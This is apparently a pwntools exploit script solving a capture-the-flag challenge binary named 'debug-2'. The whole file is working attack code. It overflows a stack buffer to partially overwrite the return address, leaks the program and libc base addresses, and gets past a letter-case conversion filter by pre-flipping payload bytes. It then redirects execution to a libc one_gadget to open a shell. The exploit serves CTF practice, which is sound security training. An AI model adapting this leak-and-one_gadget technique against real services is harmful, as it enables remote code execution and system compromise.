from pwn import *

elf = context.binary = ELF('./debug-2')
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level='debug'

# Converts characters in payload based on character conversion
def convert(a):
    x = bytearray(a)
    for i in range(len(x)):
        if (x[i] >= 65 and x[i] <= 90):
            x[i] = x[i]+32
        elif (x[i] >= 97 and x[i] <= 122):
            x[i] = x[i]-32
    return x


#p = remote("ctf.cybr.club", 443, ssl=True, sni="debug-2")
p = remote('localhost', '1337')

# printf of string gives us leak while also overwriting ret address
partial = cyclic(88) + b"\xdd"

p.sendlineafter(b"3: Exit\n", b"1")
p.sendafter(b"string (max length of 69 characters):\n", partial)
p.recvuntil(b"VAAA")

# parse leak
x = p.recvline()[:-1][::-1].hex()
log.info("leak of menu() call in main(): " + x)

elf.address = int(x, 16) - 0x00000000000013dd
log.info("Main address: " + hex(elf.sym["main"]))

# repeat to touch lib
payload = cyclic(88) + convert(p64(elf.sym["menu"] + 1))

p.sendlineafter(b"3: Exit\n", b"1")
p.sendafter(b"string (max length of 69 characters):\n", payload)

# leak libc
payload = cyclic(88) + b'\x94'

p.sendlineafter(b"3: Exit\n", b"1")
p.sendafter(b"string (max length of 69 characters):\n", payload)
p.recvuntil(b"VAAA")
x = p.recvline()[:-1][::-1].hex()
log.info("leak of __libc_start_call_main+228: " + x)

libc.address = int(x, 16) - 228 - 0x0000000000023fb0
log.info("Libc address: " + hex(libc.address))

# one_gadget is required since we can only overwrite ret addr
one_gadget = libc.address + 0x449d3

payload = cyclic(88) + convert(p64(one_gadget))

p.sendlineafter(b"3: Exit\n", b"1")
p.sendafter(b"string (max length of 69 characters):\n", payload)

p.interactive()
